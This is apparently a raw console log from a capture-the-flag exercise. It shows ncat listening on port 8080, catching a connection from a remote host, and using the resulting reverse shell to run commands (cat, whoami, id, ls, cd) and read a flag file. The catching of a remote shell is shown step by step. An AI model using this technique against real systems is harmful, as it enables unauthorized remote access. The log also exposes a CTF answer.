C:\Users\catsr\nmap-7.80-win32\nmap-7.80>ncat.exe -l -p 8080 -vvv
Ncat: Version 7.80 ( https://nmap.org/ncat )
NCAT DEBUG: Initialized fdlist with 63 maxfds
Ncat: Listening on :::8080
NCAT DEBUG: Added fd 352 to list, nfds 1, maxfd 352
Ncat: Listening on 0.0.0.0:8080
NCAT DEBUG: Added fd 360 to list, nfds 2, maxfd 360
NCAT DEBUG: Added fd 0 to list, nfds 3, maxfd 360
NCAT DEBUG: Initialized fdlist with 60 maxfds
NCAT DEBUG: selecting, fdmax 360
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 360 is ready
Ncat: Connection from 152.14.92.89.
NCAT DEBUG: Swapping fd[0] (352) with fd[2] (0)
NCAT DEBUG: Removed fd 352 from list, nfds 2, maxfd 360
NCAT DEBUG: Swapping fd[1] (360) with fd[1] (360)
NCAT DEBUG: Removed fd 360 from list, nfds 1, maxfd 0
Ncat: Connection from 152.14.92.89:48618.
NCAT DEBUG: Added fd 356 to list, nfds 2, maxfd 356
NCAT DEBUG: Added fd 356 to list, nfds 1, maxfd 356
NCAT DEBUG: selecting, fdmax 356
/bin/bash
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
/bin/cat /home/flag.txt
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 356 is ready
flag{p3rm1ss10n_3xpl0it@t!0n}
NCAT DEBUG: selecting, fdmax 356
whoami
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 356 is ready
/bin/bash: line 2: /usr/bin/whoami: Permission denied
NCAT DEBUG: selecting, fdmax 356
id
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 356 is ready
/bin/bash: line 3: /usr/bin/id: Permission denied
NCAT DEBUG: selecting, fdmax 356
ls
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 356 is ready
debug.sh
NCAT DEBUG: selecting, fdmax 356
cd /home
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
ls
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 356 is ready
ctfuser
flag.txt
notes.txt
NCAT DEBUG: selecting, fdmax 356
cd ctfuser
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
ls
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
cd /opt
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
ls
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
cd /home
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
ls
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 356 is ready
ctfuser
flag.txt
notes.txt
NCAT DEBUG: selecting, fdmax 356
cat flag.txt
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 0 is ready
NCAT DEBUG: selecting, fdmax 356
NCAT DEBUG: select returned 1 fds ready
NCAT DEBUG: fd 356 is ready
flag{p3rm1ss10n_3xpl0it@t!0n}
NCAT DEBUG: selecting, fdmax 356
